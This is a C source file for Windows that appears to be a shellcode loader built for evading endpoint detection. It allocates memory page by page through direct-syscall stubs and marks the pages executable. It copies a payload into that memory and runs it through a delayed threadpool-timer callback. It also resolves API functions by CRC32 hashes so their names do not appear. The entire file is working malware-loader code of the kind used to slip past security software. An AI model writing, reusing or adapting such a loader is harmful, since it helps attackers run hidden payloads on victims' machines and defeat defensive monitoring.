#include "inject.h"

BOOL Inject(PBYTE* pInjectedPayload)
{
    PBYTE pPayloadBuffer = pPayload;
    SIZE_T sPayloadSize = sSize;
    NTSTATUS	STATUS			    = 0x00;
    SIZE_T		sNewPayloadSize		= SET_TO_MULTIPLE_OF_4096(sPayloadSize);
    SIZE_T      sChunkSize		    = PAGE_SIZE;
    DWORD		ii			        = sNewPayloadSize / PAGE_SIZE;
    DWORD       dwOldPermissions	= 0x00;
    PVOID		pAddress		    = NULL;
    PVOID       pTmpAddress		    = NULL;
    PBYTE		pTmpPayload		    = NULL;
    SIZE_T      dwNumberOfbytes     = (SIZE_T) NULL;
    sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;
    STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY);
    if (STATUS != 0)
    {
        return FALSE;
    }

    sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
    pAddress        = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);
    pTmpAddress = pAddress;

    for (DWORD i = 0; i < ii; i++)
    {
        STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE);
        if (STATUS != 0)
        {
            return FALSE;
        }
        pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
    }

    pTmpAddress = pAddress;

    for (DWORD i = 0; i < ii; i++)
    {
        STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions);
        if (STATUS != 0)
        {
            return FALSE;
        }
        pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
    }
    pTmpAddress = pAddress;
    pTmpPayload = pPayloadBuffer;

    for (DWORD i = 0; i < ii; i++)
    {
        memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);

        pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
        pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
    }

    *pInjectedPayload = pAddress;
    return TRUE;
}

VOID Execute(PVOID pInjectedPayload)
{
    TP_CALLBACK_ENVIRON		tpCallbackEnv	= { 0 };
    FILETIME				FileDueTime		= { 0 };
    ULARGE_INTEGER			ulDueTime		= { 0 };
    PTP_TIMER				ptpTimer		= NULL;

    if (!pInjectedPayload)
    {
        return;
    }

    fnCreateThreadpoolTimer				pCreateThreadpoolTimer				= (fnCreateThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), CreateThreadpoolTimer_CRC32);
    fnSetThreadpoolTimer				pSetThreadpoolTimer					= (fnSetThreadpoolTimer)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), SetThreadpoolTimer_CRC32);
    fnWaitForSingleObject				pWaitForSingleObject				= (fnWaitForSingleObject)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), WaitForSingleObject_CRC32);

    if (!pCreateThreadpoolTimer || !pSetThreadpoolTimer || !pWaitForSingleObject)
    {
        return;
    }

    InitializeThreadpoolEnvironment(&tpCallbackEnv);

    if (!(ptpTimer = pCreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &tpCallbackEnv)))
    {
        return;
    }

    ulDueTime.QuadPart			= (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
    FileDueTime.dwHighDateTime	= ulDueTime.HighPart;
    FileDueTime.dwLowDateTime	= ulDueTime.LowPart;

    pSetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
    pWaitForSingleObject((HANDLE)-1, INFINITE);
}